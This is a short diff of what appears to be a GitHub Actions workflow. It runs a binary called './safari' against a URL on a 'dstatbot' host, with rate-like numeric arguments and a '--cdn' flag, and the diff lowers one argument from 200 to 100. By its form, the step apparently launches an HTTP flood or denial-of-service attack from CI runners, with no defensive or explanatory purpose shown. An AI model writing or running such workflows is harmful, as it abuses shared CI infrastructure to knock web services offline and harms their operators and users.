@@ -31,7 +31,7 @@ jobs:
         run: |
           chmod +x *
           
-          ./safari https://c1.dstatbot.win/dMweR88e   200 4000 1000 Heh --cdn --raw 
+          ./safari https://c1.dstatbot.win/dMweR88e   100 4000 1000 Heh --cdn --raw 
           
           
           
